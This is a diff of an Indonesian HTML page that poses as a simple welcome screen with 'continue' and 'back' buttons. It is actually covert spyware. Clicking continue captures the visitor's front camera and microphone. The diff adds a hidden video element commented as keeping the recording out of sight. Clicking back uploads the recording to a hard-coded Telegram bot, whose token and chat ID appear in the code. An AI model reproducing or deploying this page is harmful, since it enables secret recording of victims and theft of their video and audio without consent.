@@ -1,99 +1,107 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Rekaman Background</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      background: url('https://files.catbox.moe/c7fi9o.png') no-repeat center center/cover;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      font-family: sans-serif;
-      color: #fff;
-    }
-    h1 {
-      font-size: 36px;
-      margin-bottom: 20px;
-      text-shadow: 2px 2px 4px #000;
-    }
-    button {
-      padding: 12px 30px;
-      font-size: 18px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      margin: 10px;
-      background: rgba(0,0,0,0.6);
-      color: #0f0;
-      text-shadow: 1px 1px 2px #000;
-      transition: 0.3s;
-    }
-    button:hover {
-      background: rgba(0,0,0,0.8);
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rekaman Background</title>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    background: url('https://files.catbox.moe/c7fi9o.png') no-repeat center center/cover;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    font-family: sans-serif;
+    color: #fff;
+  }
+  h1 {
+    font-size: 36px;
+    margin-bottom: 20px;
+    text-shadow: 2px 2px 4px #000;
+  }
+  button {
+    padding: 12px 30px;
+    font-size: 18px;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    margin: 10px;
+    background: rgba(0,0,0,0.6);
+    color: #0f0;
+    text-shadow: 1px 1px 2px #000;
+    transition: 0.3s;
+  }
+  button:hover {
+    background: rgba(0,0,0,0.8);
+  }
+  video {
+    display: none; /* video tersembunyi, rekaman tetap jalan */
+  }
+</style>
 </head>
 <body>
 
-  <h1>Selamat Datang</h1>
-  <button id="startBtn">Lanjutkan</button>
-  <button id="stopBtn">Kembali</button>
+<h1>Selamat Datang</h1>
+<button id="startBtn">Lanjutkan</button>
+<button id="stopBtn">Kembali</button>
 
-  <canvas id="canvas" style="display:none;"></canvas>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-  <script>
-    const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
-    const CHAT_ID = "7412613560";
+<script>
+const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
+const CHAT_ID = "7412613560";
 
-    let recorder, chunks = [], stream;
+let recorder, chunks = [], stream;
 
-    const startBtn = document.getElementById('startBtn');
-    const stopBtn = document.getElementById('stopBtn');
-    const canvas = document.getElementById('canvas');
+const startBtn = document.getElementById('startBtn');
+const stopBtn = document.getElementById('stopBtn');
+const video = document.getElementById('video');
 
-    startBtn.addEventListener('click', async () => {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-        recorder = new MediaRecorder(stream);
-        chunks = [];
+startBtn.addEventListener('click', async () => {
+  try {
+    // akses kamera & mikrofon
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+    video.srcObject = stream;
 
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.start();
-      } catch(err) {
-        console.error("Tidak bisa mengakses kamera/mikrofon:", err);
-      }
-    });
+    recorder = new MediaRecorder(stream);
+    chunks = [];
 
-    stopBtn.addEventListener('click', async () => {
-      if(recorder && recorder.state !== 'inactive') {
-        recorder.stop();
-      }
-      if(stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.start();
 
-      recorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: "video/webm" });
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("video", blob, "rekaman.webm");
+  } catch(err) {
+    console.error("Tidak bisa mengakses kamera/mikrofon:", err);
+  }
+});
 
-        try {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-            method: "POST",
-            body: formData
-          });
-        } catch(err) {
-          console.error("Gagal mengirim video:", err);
-        }
-      };
-    });
-  </script>
+stopBtn.addEventListener('click', async () => {
+  if(recorder && recorder.state !== 'inactive') {
+    recorder.stop();
+  }
+  if(stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
+
+  recorder.onstop = async () => {
+    const blob = new Blob(chunks, { type: "video/webm" });
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("video", blob, "rekaman.webm");
+
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+        method: "POST",
+        body: formData
+      });
+    } catch(err) {
+      console.error("Gagal mengirim video:", err);
+    }
+  };
+});
+</script>
 
 </body>
 </html>
